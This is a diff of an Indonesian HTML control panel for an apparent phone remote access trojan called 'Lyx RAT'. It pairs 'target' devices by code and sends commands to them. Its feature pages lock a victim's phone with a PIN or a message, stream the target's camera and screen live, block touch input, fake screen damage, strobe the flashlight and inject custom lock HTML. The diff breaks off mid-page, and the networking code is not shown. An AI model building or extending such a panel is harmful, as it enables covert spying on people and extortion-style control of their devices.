@@ -2,982 +2,843 @@
 <html lang="id">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Lyx RAT Control</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Lyx RAT Panel</title>
 <style>
-* { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system,'Segoe UI',sans-serif; -webkit-tap-highlight-color:transparent; }
-html, body { width:100%; min-height:100vh; overflow-x:hidden; background:#0a0a0a; color:#0f0; }
-body { padding:15px; padding-bottom:40px; }
+  * { margin:0; padding:0; box-sizing:border-box; font-family:'Segoe UI',sans-serif; }
+  body {
+    background:#0a0e0a;
+    color:#00ff88;
+    min-height:100vh;
+    padding:20px;
+    background-image:
+      repeating-linear-gradient(0deg, rgba(0,255,136,0.03) 0px, rgba(0,255,136,0.03) 1px, transparent 1px, transparent 3px),
+      radial-gradient(circle at 50% 0%, #0d1a0d 0%, #000 100%);
+  }
+  .header {
+    display:flex; justify-content:space-between; align-items:center;
+    padding:15px 25px;
+    border:1px solid #00ff88;
+    background:rgba(0,255,136,0.05);
+    box-shadow:0 0 20px rgba(0,255,136,0.3);
+    margin-bottom:20px;
+  }
+  .logo { display:flex; align-items:center; gap:12px; }
+  .logo svg { width:42px; height:42px; filter:drop-shadow(0 0 6px #00ff88); }
+  .logo h1 { font-size:20px; letter-spacing:3px; text-shadow:0 0 8px #00ff88; }
+  .status-dot {
+    width:10px; height:10px; border-radius:50%;
+    background:#00ff88; box-shadow:0 0 10px #00ff88;
+    animation:pulse 1.5s infinite;
+  }
+  @keyframes pulse { 50% { opacity:0.3; } }
 
-/* ========== GLOBAL ========== */
-.container { max-width:900px; margin:0 auto; }
-.hidden { display:none !important; }
+  .pairing-box {
+    border:1px solid #00ff88;
+    padding:20px;
+    background:rgba(0,255,136,0.03);
+    margin-bottom:20px;
+    box-shadow:0 0 15px rgba(0,255,136,0.15);
+  }
+  .pairing-box h2 {
+    font-size:14px; letter-spacing:2px; margin-bottom:12px;
+    text-transform:uppercase;
+  }
+  .pair-row { display:flex; gap:10px; flex-wrap:wrap; }
+  .code-display {
+    flex:1;
+    min-width:200px;
+    background:#000;
+    border:1px solid #00ff88;
+    padding:14px 20px;
+    font-size:24px;
+    letter-spacing:8px;
+    text-align:center;
+    font-family:'Courier New',monospace;
+    text-shadow:0 0 12px #00ff88;
+    color:#00ff88;
+  }
+  button {
+    background:transparent;
+    border:1px solid #00ff88;
+    color:#00ff88;
+    padding:12px 22px;
+    cursor:pointer;
+    letter-spacing:2px;
+    font-size:12px;
+    text-transform:uppercase;
+    transition:all 0.2s;
+    font-weight:bold;
+  }
+  button:hover {
+    background:#00ff88; color:#000;
+    box-shadow:0 0 20px #00ff88;
+  }
+  button.danger { border-color:#ff2244; color:#ff2244; }
+  button.danger:hover { background:#ff2244; color:#000; box-shadow:0 0 20px #ff2244; }
+  button.warn { border-color:#ffaa00; color:#ffaa00; }
+  button.warn:hover { background:#ffaa00; color:#000; box-shadow:0 0 20px #ffaa00; }
 
-/* ========== HEADER ========== */
-.header {
-display:flex; align-items:center; justify-content:space-between;
-padding:15px; border:1px solid #0f0; border-radius:12px;
-background:#000; box-shadow:0 0 20px rgba(0,255,0,0.2); margin-bottom:15px;
-}
-.header-left { display:flex; align-items:center; gap:12px; }
-.header-left svg { width:32px; height:32px; }
-.header-title h1 { font-size:1.05em; color:#0f0; letter-spacing:2px; }
-.header-title p { font-size:0.7em; color:#080; margin-top:2px; }
-.header-status { display:flex; align-items:center; gap:6px; font-size:0.7em; color:#0f0; }
-.status-dot { width:8px; height:8px; background:#0f0; border-radius:50%; box-shadow:0 0 8px #0f0; animation:pulse 1.5s infinite; }
-@keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.4;} }
+  .devices-title {
+    display:flex; justify-content:space-between; align-items:center;
+    margin:25px 0 12px;
+    padding:0 5px;
+  }
+  .devices-title h2 { font-size:14px; letter-spacing:3px; }
+  .device-list { display:grid; gap:12px; }
 
-/* ========== PAGE HEADER (untuk fitur) ========== */
-.page-header {
-display:flex; align-items:center; justify-content:space-between;
-padding:12px 15px; border:1px solid #0f0; border-radius:12px;
-background:#000; margin-bottom:15px;
-}
-.page-title { display:flex; align-items:center; gap:10px; }
-.page-title svg { width:24px; height:24px; }
-.page-title h2 { font-size:0.95em; color:#0f0; letter-spacing:1px; }
-.back-btn {
-width:38px; height:38px; border:1px solid #0f0; background:#111;
-border-radius:8px; display:flex; align-items:center; justify-content:center;
-cursor:pointer; transition:0.2s;
-}
-.back-btn:active { background:#0f0; }
-.back-btn svg { width:18px; height:18px; stroke:#0f0; }
-.back-btn:active svg { stroke:#000; }
+  .device-card {
+    border:1px solid #00ff88;
+    background:rgba(0,255,136,0.04);
+    padding:16px;
+    display:flex; justify-content:space-between; align-items:center;
+    transition:all 0.2s;
+  }
+  .device-card:hover {
+    background:rgba(0,255,136,0.08);
+    box-shadow:0 0 15px rgba(0,255,136,0.3);
+  }
+  .device-info { display:flex; align-items:center; gap:15px; }
+  .device-icon svg { width:36px; height:36px; stroke:#00ff88; fill:none; stroke-width:1.5; }
+  .device-meta h3 { font-size:14px; margin-bottom:4px; }
+  .device-meta p { font-size:11px; opacity:0.6; letter-spacing:1px; }
 
-/* ========== BUTTONS ========== */
-.btn {
-padding:12px 18px; background:#0f0; color:#000; border:none;
-border-radius:8px; font-weight:bold; cursor:pointer; transition:0.2s;
-text-transform:uppercase; font-size:0.85em; letter-spacing:1px;
-}
-.btn:active { transform:scale(0.96); }
-.btn-blue { background:#0080ff; color:#fff; }
-.btn-blue:active { background:#0050a0; }
-.btn-red { background:#f00; color:#fff; }
-.btn-warn { background:#ff0; color:#000; }
-.btn-outline { background:transparent; color:#0f0; border:1px solid #0f0; }
+  /* DASHBOARD */
+  #dashboard { display:none; }
+  .dash-header {
+    display:flex; justify-content:space-between; align-items:center;
+    padding:15px 20px;
+    border:1px solid #00ff88;
+    background:rgba(0,255,136,0.05);
+    margin-bottom:20px;
+  }
+  .dash-grid {
+    display:grid;
+    grid-template-columns:repeat(auto-fill,minmax(240px,1fr));
+    gap:14px;
+  }
+  .feature-card {
+    border:1px solid #00ff88;
+    padding:18px;
+    background:rgba(0,255,136,0.03);
+    cursor:pointer;
+    transition:all 0.2s;
+    position:relative;
+  }
+  .feature-card:hover {
+    background:rgba(0,255,136,0.08);
+    box-shadow:0 0 20px rgba(0,255,136,0.4);
+    transform:translateY(-2px);
+  }
+  .feature-card svg { width:32px; height:32px; stroke:#00ff88; fill:none; stroke-width:1.5; margin-bottom:10px; }
+  .feature-card h3 { font-size:13px; letter-spacing:1px; margin-bottom:5px; }
+  .feature-card p { font-size:10px; opacity:0.5; letter-spacing:1px; }
+  .feature-badge {
+    position:absolute; top:12px; right:12px;
+    font-size:9px; padding:3px 8px;
+    border:1px solid #00ff88; letter-spacing:1px;
+  }
+  .feature-badge.on { background:#00ff88; color:#000; }
+  .feature-badge.off { opacity:0.4; }
 
-/* ========== TOGGLE SWITCH (BIRU KAYA GAMBAR) ========== */
-.toggle-row {
-display:flex; align-items:center; justify-content:space-between;
-padding:15px; background:#111; border:1px solid #0f0; border-radius:10px;
-margin-bottom:15px;
-}
-.toggle-label { color:#0f0; font-size:0.9em; }
-.toggle-label small { display:block; color:#080; font-size:0.75em; margin-top:3px; }
-.switch { position:relative; display:inline-block; width:52px; height:28px; flex-shrink:0; }
-.switch input { opacity:0; width:0; height:0; }
-.slider-sw {
-position:absolute; cursor:pointer; inset:0; background:#333;
-transition:0.3s; border-radius:28px;
-}
-.slider-sw:before {
-position:absolute; content:""; height:20px; width:20px; left:4px; bottom:4px;
-background:#fff; transition:0.3s; border-radius:50%;
-box-shadow:0 2px 4px rgba(0,0,0,0.3);
-}
-.switch input:checked + .slider-sw { background:#0080ff; }
-.switch input:checked + .slider-sw:before { transform:translateX(24px); }
-.switch input:checked + .slider-sw { box-shadow:0 0 12px rgba(0,128,255,0.6); }
+  /* MODAL */
+  .modal-overlay {
+    display:none; position:fixed; inset:0;
+    background:rgba(0,0,0,0.9);
+    z-index:1000;
+    justify-content:center; align-items:center;
+    padding:20px;
+  }
+  .modal-overlay.active { display:flex; }
+  .modal {
+    border:1px solid #00ff88;
+    background:#000;
+    padding:25px;
+    max-width:600px; width:100%;
+    box-shadow:0 0 40px rgba(0,255,136,0.4);
+    max-height:90vh; overflow-y:auto;
+  }
+  .modal h2 { font-size:16px; letter-spacing:2px; margin-bottom:18px; }
+  .modal label {
+    display:block; font-size:11px; letter-spacing:1px;
+    margin-bottom:6px; margin-top:14px; opacity:0.7;
+  }
+  .modal input, .modal textarea, .modal select {
+    width:100%;
+    background:#0a0e0a;
+    border:1px solid #00ff88;
+    color:#00ff88;
+    padding:10px 14px;
+    font-family:inherit;
+    font-size:13px;
+    outline:none;
+  }
+  .modal input:focus, .modal textarea:focus { box-shadow:0 0 10px rgba(0,255,136,0.5); }
+  .modal textarea { min-height:120px; resize:vertical; font-family:'Courier New',monospace; }
+  .modal-actions { display:flex; gap:10px; margin-top:20px; justify-content:flex-end; }
+  .toggle-row {
+    display:flex; justify-content:space-between; align-items:center;
+    padding:10px 0; border-bottom:1px solid rgba(0,255,136,0.2);
+  }
+  .toggle {
+    width:44px; height:22px; border:1px solid #00ff88;
+    border-radius:22px; position:relative; cursor:pointer;
+    transition:all 0.2s;
+  }
+  .toggle::after {
+    content:''; position:absolute; top:2px; left:2px;
+    width:16px; height:16px; background:#00ff88; border-radius:50%;
+    transition:all 0.2s;
+  }
+  .toggle.on { background:rgba(0,255,136,0.3); }
+  .toggle.on::after { left:24px; box-shadow:0 0 8px #00ff88; }
+  .camera-view, .screen-view {
+    width:100%; height:300px;
+    background:#000; border:1px solid #00ff88;
+    display:flex; justify-content:center; align-items:center;
+    margin:14px 0;
+    position:relative;
+    overflow:hidden;
+  }
+  .camera-view::before, .screen-view::before {
+    content:'LIVE'; position:absolute; top:8px; left:8px;
+    font-size:10px; padding:3px 8px;
+    background:#ff2244; color:#fff; letter-spacing:2px;
+    animation:pulse 1.5s infinite;
+  }
+  .camera-view video, .screen-view video { width:100%; height:100%; object-fit:cover; }
 
-/* ========== FORM INPUT ========== */
-.form-group { margin-bottom:15px; }
-.form-group label {
-display:block; color:#0f0; font-size:0.85em; margin-bottom:8px;
-letter-spacing:1px; text-transform:uppercase;
-}
-.form-group input, .form-group textarea, .form-group select {
-width:100%; padding:12px; background:#111; border:1px solid #0f0;
-color:#0f0; border-radius:8px; font-family:monospace; font-size:0.9em;
-outline:none; transition:0.2s;
-}
-.form-group input:focus, .form-group textarea:focus, .form-group select:focus {
-border-color:#0f0; box-shadow:0 0 10px rgba(0,255,0,0.4);
-}
-.form-group textarea { min-height:140px; resize:vertical; }
-.form-group select { cursor:pointer; }
-
-/* ========== DEVICE LIST ========== */
-.device-item {
-display:flex; justify-content:space-between; align-items:center;
-background:#111; border:1px solid #0f0; padding:14px; border-radius:10px;
-margin-bottom:10px; gap:10px; flex-wrap:wrap;
-}
-.device-info { display:flex; align-items:center; gap:12px; flex:1; min-width:200px; }
-.device-icon {
-width:42px; height:42px; border:1px solid #0f0; border-radius:8px;
-display:flex; align-items:center; justify-content:center; flex-shrink:0;
-}
-.device-icon svg { width:22px; height:22px; }
-.device-name { color:#0f0; font-weight:bold; font-size:0.9em; }
-.device-meta { font-size:0.72em; color:#080; margin-top:3px; }
-.device-meta .online { color:#0f0; }
-.device-meta .offline { color:#f00; }
-.device-actions { display:flex; gap:8px; }
-.device-actions .btn { padding:9px 14px; font-size:0.75em; }
-
-/* ========== PAIRING SECTION ========== */
-.pairing-box {
-display:flex; gap:10px; align-items:center; flex-wrap:wrap;
-padding:15px; background:#111; border:1px solid #0f0; border-radius:10px;
-}
-.code-display {
-flex:1; background:#000; border:1px solid #0f0; padding:14px;
-border-radius:8px; font-family:monospace; font-size:1.4em;
-color:#0f0; text-align:center; letter-spacing:4px; min-width:200px;
-text-shadow:0 0 10px #0f0;
-}
-
-/* ========== FEATURE GRID ========== */
-.feature-grid {
-display:grid; grid-template-columns:repeat(auto-fill,minmax(150px,1fr));
-gap:12px;
-}
-.feature-card {
-border:1px solid #0f0; border-radius:10px; padding:16px;
-background:#111; cursor:pointer; transition:0.25s;
-position:relative; overflow:hidden;
-}
-.feature-card:active { transform:scale(0.97); background:#1a1a1a; }
-.feature-card .icon-box {
-width:44px; height:44px; border:2px solid #0f0; border-radius:10px;
-display:flex; align-items:center; justify-content:center; margin-bottom:10px;
-}
-.feature-card .icon-box svg { width:22px; height:22px; }
-.feature-card h3 { color:#0f0; font-size:0.85em; margin-bottom:4px; letter-spacing:1px; }
-.feature-card p { color:#080; font-size:0.7em; line-height:1.3; }
-
-/* ========== SECTION ========== */
-.section {
-border:1px solid #0f0; border-radius:12px; padding:15px;
-margin-bottom:15px; background:#000;
-}
-.section-title {
-color:#0f0; font-size:0.9em; margin-bottom:12px;
-letter-spacing:2px; text-transform:uppercase;
-display:flex; align-items:center; gap:8px;
-}
-.section-title svg { width:16px; height:16px; }
-
-/* ========== CAMERA VIEW ========== */
-.cam-view {
-width:100%; aspect-ratio:4/3; background:#111; border:1px solid #0f0;
-border-radius:10px; display:flex; align-items:center; justify-content:center;
-color:#080; font-family:monospace; font-size:0.85em; margin-bottom:15px;
-overflow:hidden; position:relative;
-}
-.cam-view img { width:100%; height:100%; object-fit:cover; display:none; }
-.cam-view.live img { display:block; }
-.cam-view.live .placeholder { display:none; }
-.cam-view .live-badge {
-position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.8);
-color:#f00; padding:4px 10px; border-radius:4px; font-size:0.7em;
-font-family:monospace; display:none;
-}
-.cam-view.live .live-badge { display:block; }
-
-/* ========== SCREEN VIEW ========== */
-.screen-view {
-width:100%; aspect-ratio:9/16; max-width:280px; margin:0 auto 15px;
-background:#111; border:1px solid #0f0; border-radius:10px;
-display:flex; align-items:center; justify-content:center;
-color:#080; font-family:monospace; font-size:0.85em;
-overflow:hidden; position:relative;
-}
-.screen-view img { width:100%; height:100%; object-fit:cover; display:none; }
-.screen-view.live img { display:block; }
-.screen-view.live .placeholder { display:none; }
-
-/* ========== LOG ========== */
-.log-box {
-background:#000; border:1px solid #0f0; border-radius:8px;
-padding:10px; font-family:monospace; font-size:0.72em;
-max-height:180px; overflow-y:auto; color:#0f0;
-}
-.log-line { margin-bottom:3px; }
-.log-time { color:#080; }
-
-/* ========== TOAST ========== */
-#toast {
-position:fixed; bottom:20px; left:50%; transform:translateX(-50%) translateY(100px);
-background:#0f0; color:#000; padding:12px 20px; border-radius:8px;
-font-size:0.85em; font-weight:bold; z-index:100000; transition:0.3s;
-box-shadow:0 0 20px rgba(0,255,0,0.5);
-}
-#toast.show { transform:translateX(-50%) translateY(0); }
-#toast.error { background:#f00; color:#fff; }
+  .log-area {
+    border:1px solid #00ff88;
+    background:#000;
+    padding:12px;
+    font-family:'Courier New',monospace;
+    font-size:11px;
+    max-height:150px;
+    overflow-y:auto;
+    margin-top:20px;
+  }
+  .log-area p { margin-bottom:3px; opacity:0.7; }
+  .log-area p::before { content:'> '; color:#00ff88; }
 </style>
 </head>
 <body>
 
-<div class="container">
+<!-- ============================= -->
+<!-- HALAMAN UTAMA: PAIRING + LIST -->
+<!-- ============================= -->
+<div id="mainPage">
 
-<!-- ============================================ -->
-<!-- PAGE: HOME -->
-<!-- ============================================ -->
-<div id="page-home">
-<div class="header">
-<div class="header-left">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="1.5">
-<rect x="2" y="3" width="20" height="14" rx="2"/>
-<line x1="8" y1="21" x2="16" y2="21"/>
-<line x1="12" y1="17" x2="12" y2="21"/>
-<circle cx="12" cy="10" r="2"/>
-</svg>
-<div class="header-title">
-<h1>LYX RAT CONTROL</h1>
-<p>Remote Access Terminal v2.0</p>
-</div>
-</div>
-<div class="header-status">
-<div class="status-dot"></div>
-<span id="connStatus">ONLINE</span>
-</div>
-</div>
+  <div class="header">
+    <div class="logo">
+      <svg viewBox="0 0 24 24" stroke="#00ff88" fill="none" stroke-width="1.5">
+        <rect x="3" y="4" width="18" height="14" rx="2"/>
+        <path d="M8 20h8M12 18v2"/>
+        <circle cx="12" cy="11" r="2"/>
+      </svg>
+      <h1>LYX RAT PANEL</h1>
+    </div>
+    <div style="display:flex;align-items:center;gap:8px;font-size:11px;letter-spacing:2px;">
+      <span class="status-dot"></span> ONLINE
+    </div>
+  </div>
 
-<!-- PAIRING -->
-<div class="section">
-<div class="section-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<path d="M12 2L2 7l10 5 10-5-10-5z"/>
-</svg>
-PAIRING CODE
-</div>
-<div class="pairing-box">
-<div class="code-display" id="pairingCode">---- ---- ----</div>
-<button class="btn" onclick="generateCode()">GENERATE</button>
-<button class="btn btn-blue" onclick="copyCode()">COPY</button>
-</div>
-</div>
+  <!-- PAIRING -->
+  <div class="pairing-box">
+    <h2>▸ Pairing Code</h2>
+    <div class="pair-row">
+      <div class="code-display" id="pairCode">------</div>
+      <button onclick="generateCode()">Generate Code</button>
+      <button onclick="copyCode()">Copy Code</button>
+    </div>
+    <p style="font-size:11px;opacity:0.6;margin-top:12px;letter-spacing:1px;">
+      Masukkan code ini ke aplikasi target untuk pairing otomatis.
+    </p>
+  </div>
 
-<!-- DEVICE LIST -->
-<div class="section">
-<div class="section-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="5" y="2" width="14" height="20" rx="2"/>
-</svg>
-DEVICE LIST
-</div>
-<div id="deviceList">
-<p style="color:#080;font-size:0.85em;text-align:center;padding:20px;">Belum ada device terpairing...</p>
-</div>
-</div>
-</div>
+  <!-- DEVICE LIST -->
+  <div class="devices-title">
+    <h2>▸ Device List</h2>
+    <button onclick="refreshDevices()">Refresh</button>
+  </div>
 
-<!-- ============================================ -->
-<!-- PAGE: DASHBOARD -->
-<!-- ============================================ -->
-<div id="page-dashboard" class="hidden">
-<div class="page-header">
-<div class="page-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="2" y="3" width="20" height="14" rx="2"/>
-<circle cx="12" cy="10" r="2"/>
-</svg>
-<h2 id="dashTitle">DASHBOARD</h2>
-</div>
-<button class="back-btn" onclick="showPage('home')">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
-<path d="M19 12H5M12 19l-7-7 7-7"/>
-</svg>
-</button>
-</div>
+  <div class="device-list" id="deviceList">
+    <!-- device cards akan muncul di sini -->
+  </div>
 
-<div class="feature-grid">
-<div class="feature-card" onclick="showPage('lock')">
-<div class="icon-box">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="3" y="11" width="18" height="11" rx="2"/>
-<path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-</svg>
-</div>
-<h3>LOCK DEVICE</h3>
-<p>Kunci target dengan PIN</p>
-</div>
-
-<div class="feature-card" onclick="showPage('lockmsg')">
-<div class="icon-box">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="3" y="11" width="18" height="11" rx="2"/>
-<path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-<line x1="12" y1="15" x2="12" y2="17"/>
-</svg>
-</div>
-<h3>LOCK + MSG</h3>
-<p>Kunci + tampilkan pesan</p>
-</div>
-
-<div class="feature-card" onclick="showPage('camera')">
-<div class="icon-box">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
-<circle cx="12" cy="13" r="4"/>
-</svg>
-</div>
-<h3>LIVE CAMERA</h3>
-<p>Lihat kamera target</p>
-</div>
-
-<div class="feature-card" onclick="showPage('customhtml')">
-<div class="icon-box">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<polyline points="16 18 22 12 16 6"/>
-<polyline points="8 6 2 12 8 18"/>
-</svg>
-</div>
-<h3>CUSTOM HTML</h3>
-<p>Lock HTML custom</p>
-</div>
-
-<div class="feature-card" onclick="showPage('strobe')">
-<div class="icon-box">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<circle cx="12" cy="12" r="5"/>
-<line x1="12" y1="1" x2="12" y2="3"/>
-<line x1="12" y1="21" x2="12" y2="23"/>
-<line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/>
-<line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/>
-<line x1="1" y1="12" x2="3" y2="12"/>
-<line x1="21" y1="12" x2="23" y2="12"/>
-</svg>
-</div>
-<h3>STROBE</h3>
-<p>Kedipkan senter</p>
-</div>
-
-<div class="feature-card" onclick="showPage('screen')">
-<div class="icon-box">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="2" y="3" width="20" height="14" rx="2"/>
-<line x1="8" y1="21" x2="16" y2="21"/>
-<line x1="12" y1="17" x2="12" y2="21"/>
-</svg>
-</div>
-<h3>LIVE SCREEN</h3>
-<p>Lihat layar target</p>
-</div>
-
-<div class="feature-card" onclick="showPage('blocktouch')">
-<div class="icon-box">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<path d="M18 11V6a2 2 0 0 0-4 0v5"/>
-<path d="M14 10V4a2 2 0 0 0-4 0v6"/>
-<path d="M10 10.5V6a2 2 0 0 0-4 0v8"/>
-<path d="M18 8a2 2 0 1 1 4 0v6a8 8 0 0 1-8 8h-2c-2.8 0-4.5-.86-5.99-2.34l-3.6-3.6a2 2 0 0 1 2.83-2.82L7 15"/>
-</svg>
-</div>
-<h3>BLOCK TOUCH</h3>
-<p>Bekukan layar</p>
-</div>
-
-<div class="feature-card" onclick="showPage('lcd')">
-<div class="icon-box">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="2" y="3" width="20" height="14" rx="2"/>
-<line x1="2" y1="8" x2="22" y2="8"/>
-<line x1="2" y1="12" x2="22" y2="12"/>
-</svg>
-</div>
-<h3>LCD EFFECT</h3>
-<p>Efek layar rusak</p>
-</div>
-</div>
-</div>
-
-<!-- ============================================ -->
-<!-- PAGE: LOCK -->
-<!-- ============================================ -->
-<div id="page-lock" class="hidden">
-<div class="page-header">
-<div class="page-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="3" y="11" width="18" height="11" rx="2"/>
-<path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-</svg>
-<h2>LOCK DEVICE</h2>
-</div>
-<button class="back-btn" onclick="showPage('dashboard')">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
-<path d="M19 12H5M12 19l-7-7 7-7"/>
-</svg>
-</button>
-</div>
-
-<div class="toggle-row">
-<div class="toggle-label">
-Aktifkan Fitur
-<small>Status: <span id="lockStatus">OFF</span></small>
-</div>
-<label class="switch">
-<input type="checkbox" id="lockToggle" onchange="updateStatus('lockStatus', this.checked)">
-<span class="slider-sw"></span>
-</label>
-</div>
-
-<div class="form-group">
-<label>PIN (4-8 digit)</label>
-<input type="text" id="lockPin" placeholder="Masukkan PIN" maxlength="8" inputmode="numeric">
-</div>
-
-<button class="btn" style="width:100%;" onclick="sendCmd('LOCK', {pin: document.getElementById('lockPin').value, active: document.getElementById('lockToggle').checked})">KIRIM COMMAND</button>
-</div>
-
-<!-- ============================================ -->
-<!-- PAGE: LOCK + MSG -->
-<!-- ============================================ -->
-<div id="page-lockmsg" class="hidden">
-<div class="page-header">
-<div class="page-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="3" y="11" width="18" height="11" rx="2"/>
-<path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-</svg>
-<h2>LOCK + MESSAGE</h2>
-</div>
-<button class="back-btn" onclick="showPage('dashboard')">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
-<path d="M19 12H5M12 19l-7-7 7-7"/>
-</svg>
-</button>
-</div>
-
-<div class="toggle-row">
-<div class="toggle-label">
-Aktifkan Fitur
-<small>Status: <span id="lockMsgStatus">OFF</span></small>
-</div>
-<label class="switch">
-<input type="checkbox" id="lockMsgToggle" onchange="updateStatus('lockMsgStatus', this.checked)">
-<span class="slider-sw"></span>
-</label>
-</div>
-
-<div class="form-group">
-<label>PIN</label>
-<input type="text" id="lockMsgPin" placeholder="Masukkan PIN" maxlength="8" inputmode="numeric">
-</div>
-
-<div class="form-group">
-<label>Pesan untuk Target</label>
-<textarea id="lockMsgText" placeholder="Tulis pesan..."></textarea>
-</div>
-
-<button class="btn" style="width:100%;" onclick="sendCmd('LOCK_MSG', {pin: document.getElementById('lockMsgPin').value, msg: document.getElementById('lockMsgText').value, active: document.getElementById('lockMsgToggle').checked})">KIRIM COMMAND</button>
-</div>
-
-<!-- ============================================ -->
-<!-- PAGE: CAMERA -->
-<!-- ============================================ -->
-<div id="page-camera" class="hidden">
-<div class="page-header">
-<div class="page-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<path d="M23 19a2 2 0 0 1-2 2H3a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h4l2-3h6l2 3h4a2 2 0 0 1 2 2z"/>
-<circle cx="12" cy="13" r="4"/>
-</svg>
-<h2>LIVE CAMERA</h2>
-</div>
-<button class="back-btn" onclick="showPage('dashboard')">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
-<path d="M19 12H5M12 19l-7-7 7-7"/>
-</svg>
-</button>
-</div>
-
-<div class="toggle-row">
-<div class="toggle-label">
-Aktifkan Fitur
-<small>Status: <span id="cameraStatus">OFF</span></small>
-</div>
-<label class="switch">
-<input type="checkbox" id="cameraToggle" onchange="updateStatus('cameraStatus', this.checked)">
-<span class="slider-sw"></span>
-</label>
-</div>
-
-<div class="cam-view" id="camView">
-<div class="placeholder">[ CAMERA FEED OFFLINE ]</div>
-<div class="live-badge">● LIVE</div>
-<img id="camFrame" alt="camera">
-</div>
-
-<div class="form-group">
-<label>Pilih Kamera</label>
-<select id="camSelect">
-<option value="front">Kamera Depan</option>
-<option value="back">Kamera Belakang</option>
-</select>
-</div>
-
-<button class="btn" style="width:100%;" onclick="sendCmd('CAMERA', {cam: document.getElementById('camSelect').value, active: document.getElementById('cameraToggle').checked})">KIRIM COMMAND</button>
-</div>
-
-<!-- ============================================ -->
-<!-- PAGE: CUSTOM HTML -->
-<!-- ============================================ -->
-<div id="page-customhtml" class="hidden">
-<div class="page-header">
-<div class="page-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<polyline points="16 18 22 12 16 6"/>
-<polyline points="8 6 2 12 8 18"/>
-</svg>
-<h2>CUSTOM HTML</h2>
-</div>
-<button class="back-btn" onclick="showPage('dashboard')">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
-<path d="M19 12H5M12 19l-7-7 7-7"/>
-</svg>
-</button>
-</div>
-
-<div class="toggle-row">
-<div class="toggle-label">
-Aktifkan Fitur
-<small>Status: <span id="customHtmlStatus">OFF</span></small>
-</div>
-<label class="switch">
-<input type="checkbox" id="customHtmlToggle" onchange="updateStatus('customHtmlStatus', this.checked)">
-<span class="slider-sw"></span>
-</label>
-</div>
-
-<div class="form-group">
-<label>Kode HTML</label>
-<textarea id="customHtmlText" placeholder="&lt;h1&gt;Contoh&lt;/h1&gt;"></textarea>
-</div>
-
-<button class="btn" style="width:100%;" onclick="sendCmd('CUSTOM_HTML', {html: document.getElementById('customHtmlText').value, active: document.getElementById('customHtmlToggle').checked})">KIRIM COMMAND</button>
-</div>
-
-<!-- ============================================ -->
-<!-- PAGE: STROBE -->
-<!-- ============================================ -->
-<div id="page-strobe" class="hidden">
-<div class="page-header">
-<div class="page-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<circle cx="12" cy="12" r="5"/>
-<line x1="12" y1="1" x2="12" y2="3"/>
-<line x1="12" y1="21" x2="12" y2="23"/>
-<line x1="1" y1="12" x2="3" y2="12"/>
-<line x1="21" y1="12" x2="23" y2="12"/>
-</svg>
-<h2>STROBE / SENTER</h2>
-</div>
-<button class="back-btn" onclick="showPage('dashboard')">
-<svg viewBox="0 0 24 24" fill="none" stroke-width="2.5" stroke-linecap="round">
-<path d="M19 12H5M12 19l-7-7 7-7"/>
-</svg>
-</button>
-</div>
-
-<div class="toggle-row">
-<div class="toggle-label">
-Aktifkan Fitur
-<small>Status: <span id="strobeStatus">OFF</span></small>
-</div>
-<label class="switch">
-<input type="checkbox" id="strobeToggle" onchange="updateStatus('strobeStatus', this.checked)">
-<span class="slider-sw"></span>
-</label>
-</div>
-
-<div class="form-group">
-<label>Kecepatan (ms)</label>
-<input type="number" id="strobeSpeed" value="100" min="10" max="2000">
-</div>
-
-<button class="btn" style="width:100%;" onclick="sendCmd('STROBE', {speed: document.getElementById('strobeSpeed').value, active: document.getElementById('strobeToggle').checked})">KIRIM COMMAND</button>
-</div>
-
-<!-- ============================================ -->
-<!-- PAGE: SCREEN -->
-<!-- ============================================ -->
-<div id="page-screen" class="hidden">
-<div class="page-header">
-<div class="page-title">
-<svg viewBox="0 0 24 24" fill="none" stroke="#0f0" stroke-width="2">
-<rect x="2" y="3" width="20" height="14" rx="2"/>
